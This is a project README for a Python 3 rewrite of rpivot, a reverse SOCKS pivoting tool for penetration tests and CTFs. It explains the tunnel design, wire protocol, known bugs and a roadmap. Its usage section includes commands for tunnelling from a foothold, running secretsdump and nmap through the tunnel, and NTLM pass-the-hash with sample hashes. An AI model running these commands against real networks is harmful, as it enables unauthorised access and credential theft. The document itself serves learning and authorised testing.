# rpivot

Python 3 rewrite of [rpivot](https://github.com/artkond/rpivot) with an asyncio core — a reverse SOCKS proxy for penetration tests and CTFs, built to understand how reverse SOCKS proxying actually works.

> **This is a fork of [artkond/rpivot](https://github.com/artkond/rpivot)** by
> [Artem Kondratenko](https://twitter.com/artkond). The original design, protocol and
> implementation are his. Upstream has been unmaintained since July 2018 and runs on
> Python 2.6–2.7 only.

> **Status: nothing rewritten yet.** What is in this repository right now is the original
> Python 2 source plus this README. `python3 server.py` does not run. The plan is deliberately
> ordered: first make it work on Python 3 unchanged, then replace the `select()` core with
> asyncio, then add what the original never had. See [Roadmap](#roadmap).

## What this is, and what it is not

For real engagements, [ligolo-ng](https://github.com/nicocha30/ligolo-ng) and
[chisel](https://github.com/jpillora/chisel) are the better tools. They are faster, they ship
as a single static Go binary with no interpreter to find on the target, and they are
maintained. This is not competing with them.

This is a study implementation. rpivot is roughly a thousand lines of readable Python built
on one clear idea — multiplexing many connections over a single one — which is the same idea
behind SSH channels and HTTP/2 streams. That is small enough to hold in your head entirely,
which makes it the right thing to rewrite if the goal is to understand pivoting rather than
just perform it. A Go binary teaches you nothing when it misbehaves at three in the morning.

The secondary point is that Python is sometimes what you have: a locked-down Linux host with
`python3` and no compiler, or a restricted egress path where the transport needs changing on
the spot, is exactly where a readable script beats a binary you cannot modify.

## How it works

### The problem reverse SOCKS solves

You have code execution on one machine inside a network. Everything interesting is on the
other machines, which you cannot reach directly. The firewall drops inbound connections, the
host is behind NAT, and there is no port you can bind that you could then connect to.

What almost always still works is an **outbound** connection. So the tunnel is built
backwards: the machine inside the network dials out to you.

### Compared to `ssh -D`

`ssh -D` is dynamic port forwarding — an SSH client opens a SOCKS proxy locally and forwards
through the SSH server:

```
    you                                    target network
    ssh client  ── connects to ──────────>  ssh server
    SOCKS here                              exit here
```

The proxy is on your side and the exit is on their side, which is what you want. The catch
is the direction of the arrow: it requires you to reach an SSH server inside the target
network. Behind NAT or an inbound-deny firewall, you cannot.

rpivot keeps the proxy and the exit on the same sides, and reverses only who dials:

```
    you                                    target network
    server.py   <── connects from ───────  client.py
    SOCKS here                              exit here
```

Same tunnel, opposite handshake. That single change is the entire reason the tool exists.

### The tunnel

```
        internal network              |          operator machine
                                      |
   10.0.0.5  <--+                     |
                |                     |
   10.0.0.9  <--+--  client.py  =====>|  server.py  -->  127.0.0.1:1080
                |                     |                        ^
   10.0.0.20 <--+       one outbound  |                        |
                        connection    |                   proxychains
```

1. `client.py` runs on the foothold inside the target network and connects out to
   `server.py` on the operator machine. Nothing needs to be reachable inbound.
2. After the handshake, the server opens a SOCKS listener on `127.0.0.1:1080`.
3. Each SOCKS connection from your tooling becomes a **channel** inside that one tunnel. The
   server allocates a channel ID and asks the client, over the control channel, to open the
   matching connection on the far side.
4. The client connects to the real target, reports success or failure, and from then on data
   is copied between the two sockets, tagged with its channel ID.

Note what does *not* happen: there is no second TCP connection between the two machines, ever.
Fifty simultaneous connections through the proxy are fifty channels inside one flow. To
anything watching the target network's egress, this is a single long-lived connection.

### Wire format

Every message on the tunnel is a 4-byte header followed by a payload:

```
 0        2        4                          4 + length
 +--------+--------+--------------------------+
 | chan   | length |         payload          |
 | uint16 | uint16 |                          |
 +--------+--------+--------------------------+
   little endian
```

Channel `0` is reserved and never carries proxied data. Its payload is a one-byte command,
optionally followed by arguments:

| Command | Byte | Arguments | Meaning |
|---|---|---|---|
| `CHANNEL_OPEN_CMD` | `0xdd` | channel ID, IPv4, port | open a connection on the far side |
| `CHANNEL_CLOSE_CMD` | `0xcc` | channel ID | this channel is finished |
| `FORWARD_CONNECTION_SUCCESS` | `0xee` | channel ID | the far-side connect succeeded |
| `FORWARD_CONNECTION_FAILURE` | `0xff` | channel ID | the far-side connect failed |
| `PING_CMD` | `0x70` | — | keepalive |
| `CLOSE_RELAY` | `0xc4` | — | tear the whole tunnel down |

Both ends run the same shape: one `select()` loop over every socket, plus a background thread
for keepalive. There is no thread per connection — the multiplexing is what replaces it, and
that trade is the part of this codebase worth reading.

## Features

**Working now — under Python 2 only**

- Reverse tunnel, so no inbound port is needed on the target network
- SOCKS4 proxy on the operator side, ready for `proxychains` or any SOCKS4-aware tool
- Channel multiplexing — every session inside one TCP connection, keyed by a 16-bit ID
- TLV framing with a reserved control channel for setup, teardown and keepalive
- Keepalive with automatic teardown — pings every 10 s, drops the relay after 60 s of silence
- Automatic restart — after a client disconnects the server rebinds and waits for the next one
- NTLM proxy support including pass-the-hash, for pivoting out through a corporate proxy
- Zero dependencies beyond the standard library
- Single-file ZIP mode — the whole tool delivered and run as one `rpivot.zip`

**Known limitations**

- **Python 2 only.** The reason this fork exists
- **One client at a time.** `run_server()` closes the listening socket for the duration of a
  relay, so a second foothold cannot connect until the first drops
- **No authentication.** The client sends the string `RPIVOT`, the server answers
  `TUNNELRDY`. That is the entire handshake, and both strings are in this repository — anyone
  who finds the listener gets a SOCKS proxy into the target network
- **No encryption.** Everything on the tunnel is plaintext, including any credentials your
  tools push through it
- **SOCKS4 only, so no remote name resolution.** Names resolve on the operator side, which is
  the wrong side — inside an AD network the interesting hosts often exist only in internal DNS
- `send()` is used instead of `sendall()` on every relay path. A partial send truncates a
  frame, and because the framing is length-prefixed the tunnel desynchronises from that point
  on rather than losing one connection
- `recvall()` spins forever if the peer closes mid-frame: `recv()` returns `b''` and the loop
  never checks for it
- A `time.sleep()` sits inside the main loop around a blocking `select()`, which can only add
  latency
- Channel IDs are drawn at random and retried on collision, so allocation slows down as more
  channels open
- The 16-bit length field caps a frame at 65535 bytes — not a problem at the 4096-byte read
  size in use, but a protocol limit rather than a tunable
- `six.py` and `ordereddict.py` are vendored: about 1000 lines of Python 2.6 shims that exist
  only for the bundled `ntlm_auth`
- No tests, no type hints, no CI
- Trivially fingerprintable — a fixed plaintext banner in the first packet of every session

## Installation

### Prerequisites

- Python 2.6–2.7 today; Python 3.8+ once Phase 1 lands
- No third-party packages — standard library only

### Setup

```bash
git clone https://github.com/cybermaksx/rpivot.git
cd rpivot
```

Nothing to build, nothing to install.

## Usage

> Python 2 syntax until Phase 1 lands.

Start the listener on the operator machine. It waits on port 9999 and exposes a SOCKS4 proxy
on `127.0.0.1:1080` once a client connects:

```bash
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

Run the client on the foothold inside the target network:

```bash
python client.py --server-ip <operator_ip> --server-port 9999
```

Point `proxychains` at the proxy by editing `/etc/proxychains.conf`:

```
[ProxyList]
socks4 127.0.0.1 1080
```

Then send tooling through the tunnel:

```bash
proxychains nmap -sT -Pn 10.0.0.0/24
proxychains impacket-secretsdump 'CONTOSO/Alice@10.0.0.5'
```

`-sT -Pn` is not optional with nmap. SOCKS carries TCP connections, so a SYN scan or a ping
sweep has nothing to travel through.

### Through an NTLM proxy

Where the target network only reaches the internet through an authenticating proxy, the
client can pivot out through it:

```bash
python client.py --server-ip <operator_ip> --server-port 9999 \
    --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 \
    --domain CONTOSO.COM --username Alice --password 'P@ssw0rd'
```

Pass-the-hash works the same way:

```bash
python client.py --server-ip <operator_ip> --server-port 9999 \
    --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 \
    --domain CONTOSO.COM --username Alice \
    --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

### Single-file mode

The project runs straight out of a ZIP archive, which matters when only one file gets onto
the target:

```bash
zip rpivot.zip -r *.py ./ntlm_auth/
python rpivot.zip server <server_options>
python rpivot.zip client <client_options>
```

### Debugging

`--verbose` on either side logs every frame, every channel open and close, and the hex of
what is relayed. `--logfile <path>` sends it to a file instead of the terminal.

## Roadmap

The order is deliberate. Phase 1 gets a working Python 3 tool with the original architecture
intact — boring, mechanical, and the thing that makes every later phase verifiable, because
from then on there is a known-good behaviour to compare against. The interesting work starts
in Phase 2.

### Phase 0 — groundwork

| Task | Status |
|---|---|
| Read the upstream source and document the wire protocol | Done |
| README explaining the mechanism, not just the commands | Done |
| Catalogue the bugs and limitations inherited from upstream | Done |

### Phase 1 — make it run on Python 3

Straight port, no redesign. Same `select()` loop, same protocol on the wire.

| Task | Status |
|---|---|
| `relay.py` — protocol constants to `bytes`, commands as `IntEnum` | Next up |
| Replace the Python 2 `except socket.error as (code, msg)` syntax (~15 sites) | Planned |
| Fix command dispatch — indexing `bytes` yields an `int` in Python 3, so the existing comparisons against byte strings would silently never match | Planned |
| `.encode('hex')` debug logging to `bytes.hex()` | Planned |
| `optparse` to `argparse` | Planned |
| Drop the vendored `six.py` and `ordereddict.py` | Planned |
| Make NTLM optional, or move it to `pyspnego` | Planned |
| End-to-end check — tunnel on localhost, `curl --socks4` through it | Planned |
| Capture a reference trace of a working session, to diff against after the rewrite | Planned |

### Phase 2 — asyncio core

Replace the hand-rolled event loop. This is the part that makes the project mine rather than
translated.

| Task | Status |
|---|---|
| Split into modules — `protocol` (framing and commands), `relay` (channel bookkeeping), `server`, `client` | Planned |
| Rewrite the server on `asyncio.start_server` and `StreamReader`/`StreamWriter` | Planned |
| Rewrite the client the same way | Planned |
| Keepalive as a task instead of a thread | Planned |
| One task per channel, replacing the manual socket table | Planned |
| Backpressure — let the stream writer's flow control do what the fixed 4096-byte reads did by hand | Planned |
| Verify against the Phase 1 reference trace: same bytes on the wire | Planned |

### Phase 3 — fix what upstream got wrong

| Task | Status |
|---|---|
| `sendall()` semantics everywhere a frame is written | Planned |
| Raise on a closed peer instead of spinning in `recvall()` | Planned |
| Sequential channel IDs instead of random-with-retry | Planned |
| Concurrent clients — keep the listener open during a relay | Planned |

### Phase 4 — features the original never had

| Task | Status |
|---|---|
| SOCKS5 `CONNECT`, implemented from RFC 1928 | Planned |
| SOCKS5 remote name resolution — resolve on the target side, where it belongs | Planned |
| TLS on the tunnel transport via `ssl` | Planned |
| Client authentication with a pre-shared key, replacing the fixed plaintext banner | Planned |
| Local port forwarding (`ssh -L` style) alongside SOCKS | Planned |

### Phase 5 — engineering hygiene

Not last in importance. Tests arrive alongside Phase 2, not after it — the rewrite needs
something to check it against.

| Task | Status |
|---|---|
| pytest suite over the framing and the control channel | Planned |
| Tests for SOCKS4 and SOCKS5 request parsing, including malformed input | Planned |
| Type hints across the codebase | Planned |
| Docstrings on every public function | Planned |
| GitHub Actions — linter and tests on push | Planned |
| LICENSE file | Planned |

### Later, no timeline

| Task | Status |
|---|---|
| SOCKS5 UDP association | Future |
| Reconnect with channel state preserved across a dropped tunnel | Future |
| Traffic shaping to break the fixed-banner fingerprint | Future |

## Project structure

Today, as inherited from upstream:

```
rpivot/
├── server.py             # Operator side: SOCKS4 listener, channel table, select loop
├── client.py             # Target side: opens forward connections, NTLM proxy support
├── relay.py              # Shared protocol — framing, command bytes, recvall, timeouts
├── __main__.py           # Entry point for single-file ZIP mode
├── ntlm_auth/            # Vendored NTLM implementation (Python 2)
├── six.py                # Vendored py2.6 shim, only needed by ntlm_auth
├── ordereddict.py        # Vendored py2.6 shim, only needed by ntlm_auth
└── README.md
```

Where Phase 2 takes it:

```
rpivot/
├── rpivot/
│   ├── protocol.py       # Frame encode/decode, command enum — no I/O, fully testable
│   ├── socks.py          # SOCKS4 and SOCKS5 request parsing — no I/O either
│   ├── relay.py          # Channel bookkeeping, shared by both ends
│   ├── server.py         # Operator side
│   ├── client.py         # Target side
│   └── __main__.py       # CLI
├── tests/
└── README.md
```

The split is driven by testability. `protocol.py` and `socks.py` take bytes and return
objects, with no sockets involved, which means the protocol logic can be tested exhaustively
against malformed input without a network. Everything that touches I/O stays in the modules
above them. `relay.py` remains the shared contract — both ends import the same constants, so
the protocol is defined in exactly one place.

## Use cases

- **Internal network access during a pentest** — reaching hosts that only route internally,
  from a foothold that can only make outbound connections
- **CTF pivoting** — the second and third boxes on a network, once the first is yours
- **Egress testing** — finding out what a firewall actually permits outbound, as opposed to
  what its ruleset claims
- **Learning** — reading and rewriting a small, complete implementation of connection
  multiplexing

## Legal

This is an offensive security tool, published for education and for authorised testing.

Use it only on systems you own, on systems you have explicit written authorisation to test,
and in CTF environments where it is permitted. Unauthorised use against systems you do not
control is a criminal offence in most jurisdictions. You are responsible for what you do
with it.

## License

Upstream ships no licence file, so the original code carries no explicit grant. This fork
claims no ownership over Artem Kondratenko's work and keeps his attribution intact. Anything
added on top is offered under the MIT License.

## Credits

- **Original author:** Artem Kondratenko — [artkond/rpivot](https://github.com/artkond/rpivot)
- **Upstream contributor:** [Gifts](https://github.com/Gifts) — ZIP single-file mode

## Author

**CyberMaksX**
GitHub: [@cybermaksx](https://github.com/cybermaksx)
